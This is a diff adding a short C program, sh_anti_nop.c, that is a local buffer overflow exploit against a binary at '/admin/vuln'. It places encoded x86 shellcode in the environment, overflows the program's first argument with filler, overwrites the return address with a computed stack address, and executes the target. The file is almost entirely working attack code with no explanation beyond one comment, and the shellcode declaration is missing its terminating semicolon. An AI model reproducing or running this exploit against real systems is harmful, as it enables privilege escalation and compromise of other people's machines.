@@ -1,0 +1,36 @@
+/*----------sh_anti_nop.c ----------*/ 
+#include <unistd.h> 
+#include <stdlib.h> 
+
+#define BUFFER_LEN 4 
+#define OVERFLOW 8 
+#define TARGET "/admin/vuln" 
+#define ARG (0xc0000000 - 4 - sizeof(TARGET) - sizeof(shellcode)) 
+#define copy(a, b) *((int *) &arg[1][a]) = b 
+
+int main(int argc, char **argv) 
+{ 
+ char shellcode[] = 
+ "\x68\x4e\xa4\xc2\x86\xb8\xce\xa4\x4b\x70" 
+ "\x31\x04\x24\x68\x70\x21\x50\xc9\xb8\xa2" 
+ "\x91\x5b\x04\x31\x04\x24\x68\x14\x43\xf9" 
+ "\x01\xb8\x47\xca\x18\x30\x31\x04\x24\x68" 
+ "\x1f\x69\xe6\x4e\xb8\x76\xe0\x05\x1e\x31" 
+ "\x04\x24\x68\x0d\xcf\xba\x6f\xb8\x65\xe0" 
+ "\x95\x0d\x31\x04\x24\x68\x97\x24\x1b\x62" 
+ "\xb8\xf9\x0b\x68\x0a\x31\x04\x24\x68\x53" 
+ "\xbf\x93\x7d\xb8\x62\x7f\xc3\x15\x31\x04" 
+ "\x24\x68\x6c\x88\xc4\xd1\xb8\x5d\x53\x09" 
+ "\x51\x31\x04\x24\x68\x83\x16\x75\x3e\xb8" 
+ "\xb2\xd6\xc5\x29\x31\x04\x24\xff\xe4" 
+
+ char *arg[] = { TARGET, "flip", NULL }; 
+ char *envp[] = { shellcode, NULL }; 
+ int i;
+ arg[1] = malloc(BUFFER_LEN + OVERFLOW + 1); 
+ memset(arg[1], '|', BUFFER_LEN+OVERFLOW); 
+ copy(BUFFER_LEN+OVERFLOW-4, ARG); // calcule la nouvelle adresse de retour 
+ printf("-> Shellcode Address: 0x%x\n", ARG); 
+ execve(arg[0], arg, envp); 
+} 
+/*----------sh_anti_nop.c ----------*/
